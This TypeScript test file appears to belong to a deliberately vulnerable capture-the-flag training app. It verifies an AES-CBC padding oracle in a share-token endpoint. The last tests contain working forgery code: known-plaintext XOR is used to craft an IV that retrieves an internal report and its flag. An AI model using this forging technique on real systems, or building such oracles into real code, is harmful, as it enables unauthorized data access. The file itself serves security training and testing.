import {
  apiRequest,
  loginOrFail,
  authHeaders,
  TEST_USERS,
  expectFlag,
} from "../helpers/api";
import { FLAGS } from "../helpers/flags";

interface ShareResponse {
  shareUrl: string;
  token: string;
}

interface OrderShareData {
  type: string;
  order: {
    id: string;
    total: number;
    status: string;
    customerName: string;
  };
}

interface ReportShareData {
  type: string;
  title: string;
  content: string;
  flag?: string;
}

describe("AES-CBC Padding Oracle", () => {
  let bobToken: string;

  beforeAll(async () => {
    bobToken = await loginOrFail(TEST_USERS.bob.email, TEST_USERS.bob.password);
  });

  describe("Share link generation", () => {
    it("POST /api/orders/ORD-001/share returns a share token", async () => {
      const { status, data } = await apiRequest<ShareResponse>(
        "/api/orders/ORD-001/share",
        {
          method: "POST",
          headers: authHeaders(bobToken),
        }
      );

      expect(status).toBe(200);
      expect(data).toHaveProperty("token");
      expect(data).toHaveProperty("shareUrl");
      expect(data.token).toMatch(/^[0-9a-f]{64,}$/);
    });

    it("POST /api/orders/ORD-001/share requires authentication", async () => {
      const { status } = await apiRequest("/api/orders/ORD-001/share", {
        method: "POST",
      });

      expect(status).toBe(401);
    });

    it("POST /api/orders/NONEXISTENT/share returns 404", async () => {
      const { status } = await apiRequest("/api/orders/NONEXISTENT/share", {
        method: "POST",
        headers: authHeaders(bobToken),
      });

      expect(status).toBe(404);
    });
  });

  describe("Share link access", () => {
    let shareToken: string;

    beforeAll(async () => {
      const { data } = await apiRequest<ShareResponse>(
        "/api/orders/ORD-001/share",
        {
          method: "POST",
          headers: authHeaders(bobToken),
        }
      );
      shareToken = data.token;
    });

    it("GET /api/documents/share?token=<valid> returns order data", async () => {
      const { status, data } = await apiRequest<OrderShareData>(
        `/api/documents/share?token=${shareToken}`
      );

      expect(status).toBe(200);
      expect(data.type).toBe("order");
      expect(data.order.id).toBe("ORD-001");
    });

    it("does not require authentication to access shared order", async () => {
      const { status, data } = await apiRequest<OrderShareData>(
        `/api/documents/share?token=${shareToken}`
      );

      expect(status).toBe(200);
      expect(data.type).toBe("order");
    });

    it("returns 400 with missing token", async () => {
      const { status } = await apiRequest("/api/documents/share");
      expect(status).toBe(400);
    });

    it("returns 400 with invalid hex token", async () => {
      const { status } = await apiRequest(
        "/api/documents/share?token=not-hex-at-all!"
      );
      expect(status).toBe(400);
    });
  });

  describe("Padding oracle behavior", () => {
    let shareToken: string;

    beforeAll(async () => {
      const { data } = await apiRequest<ShareResponse>(
        "/api/orders/ORD-001/share",
        {
          method: "POST",
          headers: authHeaders(bobToken),
        }
      );
      shareToken = data.token;
    });

    it("returns 400 when ciphertext is tampered (bad padding)", async () => {
      const bytes = Buffer.from(shareToken, "hex");
      bytes[bytes.length - 1] ^= 0x01;
      const tampered = bytes.toString("hex");

      const { status, data } = await apiRequest<{ error: string }>(
        `/api/documents/share?token=${tampered}`
      );

      expect(status).toBe(400);
      expect(data.error).toBe("Invalid share token format");
    });

    it("returns 404 when IV is tampered (valid padding, unknown resource)", async () => {
      const bytes = Buffer.from(shareToken, "hex");
      // Flip a byte in the middle of the IV (position 6, inside the "order:" prefix)
      bytes[6] ^= 0xff;
      const tampered = bytes.toString("hex");

      const { status, data } = await apiRequest<{ error: string }>(
        `/api/documents/share?token=${tampered}`
      );

      // Should be 400 (unsupported type) or 404 (not found), but NOT 200
      expect([400, 404]).toContain(status);
      expect(status).not.toBe(200);
    });

    it("returns different status codes for bad padding vs unknown resource", async () => {
      const bytes = Buffer.from(shareToken, "hex");
      const cipherBlock = bytes.subarray(16, 32);

      // Bad padding: random IV that almost certainly won't produce valid padding
      const badPaddingIv = Buffer.from(
        "00000000000000000000000000000001",
        "hex"
      );
      const badPaddingToken = Buffer.concat([
        badPaddingIv,
        cipherBlock,
      ]).toString("hex");
      const { status: badPaddingStatus } = await apiRequest(
        `/api/documents/share?token=${badPaddingToken}`
      );

      // Valid padding: use original IV but flip a non-critical byte
      const { status: validTokenStatus } = await apiRequest(
        `/api/documents/share?token=${shareToken}`
      );

      // The oracle: bad padding gives 400, valid token gives 200
      expect(badPaddingStatus).toBe(400);
      expect(validTokenStatus).toBe(200);
    });
  });

  describe("Type leak in error message", () => {
    let shareToken: string;

    beforeAll(async () => {
      const { data } = await apiRequest<ShareResponse>(
        "/api/orders/ORD-001/share",
        {
          method: "POST",
          headers: authHeaders(bobToken),
        }
      );
      shareToken = data.token;
    });

    it("leaks supported resource types for unknown type", async () => {
      // Forge a token that decrypts to a plaintext starting with an unknown type
      // We use the known plaintext to compute the intermediate state directly
      const bytes = Buffer.from(shareToken, "hex");
      const iv = bytes.subarray(0, 16);
      const cipherBlock = bytes.subarray(16, 32);

      const knownPlaintext = Buffer.from("order:ORD-001\x03\x03\x03");
      const intermediate = Buffer.alloc(16);
      for (let i = 0; i < 16; i++) {
        intermediate[i] = iv[i] ^ knownPlaintext[i];
      }

      // Forge for "zzzzz:test\x06\x06\x06\x06\x06\x06"
      const target = Buffer.from("zzzzz:test\x06\x06\x06\x06\x06\x06");
      const newIv = Buffer.alloc(16);
      for (let i = 0; i < 16; i++) {
        newIv[i] = intermediate[i] ^ target[i];
      }
      const forgedToken = Buffer.concat([newIv, cipherBlock]).toString("hex");

      const { status, data } = await apiRequest<{ error: string }>(
        `/api/documents/share?token=${forgedToken}`
      );

      expect(status).toBe(400);
      expect(data.error).toContain("Unsupported resource type");
      expect(data.error).toContain("order");
      expect(data.error).toContain("report");
    });
  });

  describe("Flag retrieval via forged token", () => {
    it("forged token for report:internal returns the flag", async () => {
      const { data: shareData } = await apiRequest<ShareResponse>(
        "/api/orders/ORD-001/share",
        {
          method: "POST",
          headers: authHeaders(bobToken),
        }
      );

      const bytes = Buffer.from(shareData.token, "hex");
      const iv = bytes.subarray(0, 16);
      const cipherBlock = bytes.subarray(16, 32);

      const knownPlaintext = Buffer.from("order:ORD-001\x03\x03\x03");
      const intermediate = Buffer.alloc(16);
      for (let i = 0; i < 16; i++) {
        intermediate[i] = iv[i] ^ knownPlaintext[i];
      }

      const target = Buffer.from("report:internal\x01");
      const newIv = Buffer.alloc(16);
      for (let i = 0; i < 16; i++) {
        newIv[i] = intermediate[i] ^ target[i];
      }
      const forgedToken = Buffer.concat([newIv, cipherBlock]).toString("hex");

      const { status, data } = await apiRequest<ReportShareData>(
        `/api/documents/share?token=${forgedToken}`
      );

      expect(status).toBe(200);
      expect(data.type).toBe("report");
      expect(data.title).toBe("Internal Security Audit Report");
      expectFlag(data, FLAGS.AES_CBC_PADDING_ORACLE);
    });
  });
});
